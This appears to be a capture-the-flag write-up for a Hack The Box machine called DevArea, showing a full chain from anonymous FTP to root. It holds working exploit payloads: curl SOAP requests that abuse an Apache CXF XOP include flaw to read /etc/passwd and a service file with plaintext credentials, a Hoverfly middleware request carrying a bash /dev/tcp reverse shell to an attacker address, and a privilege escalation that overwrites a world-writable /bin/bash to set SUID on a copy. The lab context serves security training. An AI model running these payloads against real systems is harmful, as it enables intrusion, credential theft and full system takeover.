
<img src="Images/devarea.png" width="202" alt="devarea">


# Attack Path

```
FTP anonyme → employee-service.jar
└─► CVE-2022-46364 (Apache CXF MTOM/XOP SSRF)
    └─► LFI → /etc/systemd/system/hoverfly.service
        └─► Creds admin:O7IJ27MyyXiU
            └─► CVE-2025-54123 (Hoverfly RCE middleware)
                └─► Shell dev_ryan
                    └─► /bin/bash world-writable + sudo syswatch.sh
                        └─► root
```

# Sommaire

- [Enumeration](#enumeration)
- [FTP](#ftp)
	- [Files Discovery](#files-discovery)
	- [Unzip and source files](#unzip-and-source-files)
	- [Apache CXF](#apache-cxf)
- [Exploit of CVE-2022-46364](#exploit-of-cve-2022-46364)
	- [Testing](#testing)
	- [Credentials for hoverfly](#credentials-for-hoverfly)
- [Hoverfly](#hoverfly)
	- [Login](#login)
	- [CVE-2025-54123 exploit](#cve-2025-54123-exploit)
- [Privilege Escalation](#privilege-escalation)

---
# Enumeration

```
nmap -sVC -p- 10.129.11.31 -oN scan.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2026-03-28 21:08 CET
Nmap scan report for 10.129.11.31
Host is up (0.031s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.97
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 83136ba19b28fdbd5d2bee03be9c8d82 (ECDSA)
|_  256 0a86fa65d120b43a5713d11ac2de5278 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://devarea.htb/
|_http-server-header: Apache/2.4.58 (Ubuntu)
8080/tcp open  http    Jetty 9.4.27.v20200227
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.27.v20200227)
8500/tcp open  fmtp?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sat, 28 Mar 2026 20:09:48 GMT
|     Content-Length: 64
|     This is a proxy server. Does not respond to non-proxy requests.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions:
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sat, 28 Mar 2026 20:09:20 GMT
|     Content-Length: 64
|_    This is a proxy server. Does not respond to non-proxy requests.
8888/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Hoverfly Dashboard
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.97 seconds
```

```
echo '10.129.11.31 devarea.htb' | tee -a /etc/hosts
```
# FTP

### Files Discovery

Nothing was usefull on port 80 so let's head to FTP which allow anonymous login.

```
ftp 10.129.11.31                                                
Connected to 10.129.11.31.
220 (vsFTPd 3.0.5)
Name (10.129.11.31:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
ftp> cd pub
ftp> ls
-rw-r--r--    1 ftp      ftp       6445030 Sep 22  2025 employee-service.jar
ftp> get employee-service.jar
local: employee-service.jar remote: employee-service.jar
229 Entering Extended Passive Mode (|||46680|)
150 Opening BINARY mode data connection for employee-service.jar (6445030 bytes).
100% |***************************************************************************|  6293 KiB    4.47 MiB/s    00:00 ETA
226 Transfer complete.
6445030 bytes received in 00:01 (4.37 MiB/s)
```

We found a `.jar` archive which we can download on our machine.

### Unzip and source files

Let's unzip the archive.

```
unzip employee-service.jar -d extract
```
```
cd /workspace/extract/htb/devarea
[Mar 28, 2026 - 21:59:35 (CET)] exegol-htb devarea # ls
EmployeeService.class  EmployeeServiceImpl.class  Report.class  ServerStarter.class
```

There are class files, we need to decompile them in order to see what they conteins.

```
jadx extract/htb/devarea/ -d decompiled_source
```

```
cat decompiled_source/sources/htb/devarea/ServerStarter.java
package htb.devarea;

import org.apache.cxf.jaxws.JaxWsServerFactoryBean;

/* loaded from: ServerStarter.class */
public class ServerStarter {
    public static void main(String[] args) {
        JaxWsServerFactoryBean factory = new JaxWsServerFactoryBean();
        factory.setServiceClass(EmployeeService.class);
        factory.setServiceBean(new EmployeeServiceImpl());
        factory.setAddress("http://0.0.0.0:8080/employeeservice");
        factory.create();
        System.out.println("Employee Service running at http://localhost:8080/employeeservice");
        System.out.println("WSDL available at http://localhost:8080/employeeservice?wsdl");
    }
}
```

### Apache CXF

We found an Endpoint on the Jetty application. We know that **apache CXF** is used from the output of the unzipped file. Let's see it's version.

```
cat extract/META-INF/maven/org.apache.cxf/cxf-core/pom.properties

#Generated by org.apache.felix.bundleplugin

#Tue Sep 16 21:03:07 WEST 2025

version=3.2.14

groupId=org.apache.cxf

artifactId=cxf-core
```

The version of **Apache CXF** is 3.2.14 which is vulnerable to **[CVE-2022-46364](https://www.cvedetails.com/cve/CVE-2022-46364/)**.
The vulnerability allow an attacker to perform an SSRF attack.

# Exploit of CVE-2022-46364

### Testing

![Burpsuite CVE](Images/Burpsuite%20CVE.png)

```
echo 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjQyOjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kbm9ib2R5Ong6NjU1MzQ6NjU1MzQ6bm9ib2R5Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLW5ldHdvcms6eDo5OTg6OTk4OnN5c3RlbWQgTmV0d29yayBNYW5hZ2VtZW50Oi86L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4Ojk5Nzo5OTc6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbjovOi91c3Ivc2Jpbi9ub2xvZ2luCm1lc3NhZ2VidXM6eDoxMDE6MTAyOjovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1yZXNvbHZlOng6OTkyOjk5MjpzeXN0ZW1kIFJlc29sdmVyOi86L3Vzci9zYmluL25vbG9naW4KcG9sbGluYXRlOng6MTAyOjE6Oi92YXIvY2FjaGUvcG9sbGluYXRlOi9iaW4vZmFsc2UKcG9sa2l0ZDp4Ojk5MTo5OTE6VXNlciBmb3IgcG9sa2l0ZDovOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c2xvZzp4OjEwMzoxMDQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgp1dWlkZDp4OjEwNDoxMDU6Oi9ydW4vdXVpZGQ6L3Vzci9zYmluL25vbG9naW4KdGNwZHVtcDp4OjEwNToxMDc6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgp0c3M6eDoxMDY6MTA4OlRQTSBzb2Z0d2FyZSBzdGFjaywsLDovdmFyL2xpYi90cG06L2Jpbi9mYWxzZQpsYW5kc2NhcGU6eDoxMDc6MTA5OjovdmFyL2xpYi9sYW5kc2NhcGU6L3Vzci9zYmluL25vbG9naW4KZnd1cGQtcmVmcmVzaDp4Ojk4OTo5ODk6RmlybXdhcmUgdXBkYXRlIGRhZW1vbjovdmFyL2xpYi9md3VwZDovdXNyL3NiaW4vbm9sb2dpbgp1c2JtdXg6eDoxMDg6NDY6dXNibXV4IGRhZW1vbiwsLDovdmFyL2xpYi91c2JtdXg6L3Vzci9zYmluL25vbG9naW4Kc3NoZDp4OjEwOTo2NTUzNDo6L3J1bi9zc2hkOi91c3Ivc2Jpbi9ub2xvZ2luCmRldl9yeWFuOng6MTAwMToxMDAxOjovaG9tZS9kZXZfcnlhbjovYmluL2Jhc2gKZnRwOng6MTEwOjExMTpmdHAgZGFlbW9uLCwsOi9zcnYvZnRwOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3dhdGNoOng6OTg0Ojk4NDo6L29wdC9zeXN3YXRjaDovdXNyL3NiaW4vbm9sb2dpbgpwb3N0Zml4Ong6MTExOjExMjo6L3Zhci9zcG9vbC9wb3N0Zml4Oi91c3Ivc2Jpbi9ub2xvZ2luCl9sYXVyZWw6eDo5OTk6OTg3OjovdmFyL2xvZy9sYXVyZWw6L2Jpbi9mYWxzZQpkaGNwY2Q6eDoxMDA6NjU1MzQ6REhDUCBDbGllbnQgRGFlbW9uLCwsOi91c3IvbGliL2RoY3BjZDovYmluL2ZhbHNlCg==' | base64 -d                             

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
ftp:x:110:111:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
syswatch:x:984:984::/opt/syswatch:/usr/sbin/nologin
postfix:x:111:112::/var/spool/postfix:/usr/sbin/nologin
_laurel:x:999:987::/var/log/laurel:/bin/false
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
```

Ou avec `curl`

```
curl -s -X POST http://10.129.11.31:8080/employeeservice \
-H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="<root@cxf.apache.org>"; start-info="text/xml"' \
--data-binary $'--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-ID: <root@cxf.apache.org>\r\n\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">\r\n<soapenv:Body><dev:submitReport><arg0>\r\n<confidential>false</confidential>\r\n<content>x</content>\r\n<department>x</department>\r\n<employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/></employeeName>\r\n</arg0></dev:submitReport></soapenv:Body>\r\n</soapenv:Envelope>\r\n--MIMEBoundary--'
```
### Credentials for hoverfly

Now that we know the vulnerabilty works, we can target specific files to get a foothold on the target. Since basic things like retrieving ssh key of user `dev_ryan` doesn't work, let's try to get config files from **hoverlfy** which is running on port 8888.
For exemple `etc/systemd/system/hoverfly.service`.

```
curl -s -X POST http://10.129.11.31:8080/employeeservice \      -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="<root@cxf.apache.org>"; start-info="text/xml"' \                                                                                               --data-binary $'--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-ID: <root@cxf.apache.org>\r\n\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/"><soapenv:Body><dev:submitReport><arg0><confidential>false</confidential><content>x</content><department>x</department><employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/systemd/system/hoverfly.service"/></employeeName></arg0></dev:submitReport></soapenv:Body></soapenv:Envelope>\r\n--MIMEBoundary--' 

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ns2:submitReportResponse xmlns:ns2="http://devarea.htb/"><return>Report received from W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFNlYz01ClN0YXJ0TGltaXRJbnRlcnZhbFNlYz02MApTdGFydExpbWl0QnVyc3Q9NQpMaW1pdE5PRklMRT02NTUzNgpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==. Department: x. Content: x</return></ns2:submitReportResponse></soap:Body></soap:Envelope>
```

```
echo 'W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFNlYz01ClN0YXJ0TGltaXRJbnRlcnZhbFNlYz02MApTdGFydExpbWl0QnVyc3Q9NQpMaW1pdE5PRklMRT02NTUzNgpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==' | base64 -d        
[Unit]
Description=HoverFly service
After=network.target

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0

Restart=on-failure
RestartSec=5
StartLimitIntervalSec=60
StartLimitBurst=5
LimitNOFILE=65536
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

And we got the credentials `admin`:`O7IJ27MyyXiU`

# Hoverfly

The credentials we retrieved doesn't work with `ssh`, let's see if we can exploit Hoverfly on port 8888.
### Login

![Hoverfly login](Images/Hoverfly%20login.png)We need credentials to connect, let's test those we got.

![Hoverfly Dashboard](Images/Hoverfly%20Dashboard.png)

It worked, and we know the version is **1.11.3**.

### CVE-2025-54123 exploit

That version is vulnerable to **[CVE-2025-54123](https://www.ameeba.com/blog/cve-2025-54123-remote-code-execution-vulnerability-in-hoverfly-api-simulation-tool/)**. In order to exploit it we need to get the token bearer of our session. We can simply go in the network tab in the developper tools to get it.

Or we can use `curl`

```
curl -s -X POST http://devarea.htb:8888/api/token-auth \                                                                                                  -H "Content-Type: application/json" \                                                                                                                                                                            -d '{"username":"admin","password":"O7IJ27MyyXiU"}'                                                                                                                                                            {"token":"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODU4MzExMTMsImlhdCI6MTc3NDc5MTExMywic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.YhnQSf37XK3sg6p95RElMsVQPaSEDD0amwVL25r3Nzusl3p-HQissHmk2qQWW63oqdrMNIqDOZnojuByKavZJA"}
```

Once we have it we can start a listener

```
penelope -i tun0 -p 443
```

And do this curl request to get a reverse shell

```
curl -X PUT http://10.129.11.31:8888/api/v2/hoverfly/middleware \
-H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODU3NzM0NjIsImlhdCI6MTc3NDczMzQ2Miwic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.YPCYm0fTMz_QF6050ehmOJQqM_U-4KN9jMQ6eq8L0WBcvYomEYlosGG_A-UEpOt_FrYwrVltsAMv6IFfRI0KhA" \
-H "Content-Type: application/json" \
-d '{"binary":"/bin/bash","script":"bash -c \"bash -i >& /dev/tcp/10.10.14.x/443 0>&1\""}'
```

```
penelope -i tun0 -p 443
[+] Listening for reverse shells on 10.10.14.97:443
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from devarea~10.129.11.31-Linux-x86_64 😍️ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
[+] Logging to /root/.penelope/sessions/devarea~10.129.11.31-Linux-x86_64/2026_03_28-22_48_48-792.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
dev_ryan@devarea:/opt/HoverFly$
```

And we got a reverse shell as `dev_ryan`.

# Privilege Escalation


```
dev_ryan@devarea:~$ sudo -l
Matching Defaults entries for dev_ryan on devarea:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh web-stop, !/opt/syswatch/syswatch.sh
        web-restart
```

We have the sudo right to start the script `/opt/syswatch/syswatch.sh` but not with the argument `web-stop` or `web-restart`.

```
dev_ryan@devarea:/tmp$ ls -la /bin/bash
-rwxrwxrwx 1 root root 1446024 Mar 31  2024 /bin/bash
```

We also have full rights on `/bin/bash` which is unusual and a vector for exploitation.
Since `syswatch.sh` probably use `/bin/bash` for it's command, we can probably set a malicious bash so we can escalate our privilege.

First we need to get an `/bin/sh` shell, otherwise this would break our session and we will have to restart the target.

```
exec /bin/sh
```

**Note** : We can't just do `/bin/sh` because that process would be a process child of our `/bin/bash` session so it would still break our reverse shell and the shell of the user.

Then we make a copy of `/bin/bash`

```
cp /bin/bash /tmp/bash.bak
```
Now we need to create an evil bash which will run the commands inside when we will use the script `syswatch.sh` as sudo.

```
nano hacked_bash

#!/tmp/bash.bak
chown root:root /tmp/bash.bak
chmod +s /tmp/bash.bak
```

Before copying our malicious bash, we need to kill all process of bash since it's busy.

```
killall -9 bash 2>/dev/null
```

And we can copy our file to `/bin/bash`

```
cp /tmp/hacked_bash /bin/bash
```

We can't exploit our sudo privilege now

```
sudo /opt/syswatch/syswatch.sh --help
```

We should see that the permission of `/tmp/bash.bak` changed.

```
$ ls -la
total 1496
drwxrwxrwt 18 root     root        4096 Mar 29 12:15 .
drwxr-xr-x 24 root     root        4096 Mar 22 18:55 ..
-rwsr-sr-x  1 root     root     1446024 Mar 29 12:12 bash.bak
```
Which means we can get a root shell with the SUID sets on `bash.bak`.

```
$ ./bash.bak -p
bash.bak-5.2# id
uid=1001(dev_ryan) gid=1001(dev_ryan) euid=0(root) egid=0(root) groups=0(root),1001(dev_ryan)
```

We are root.
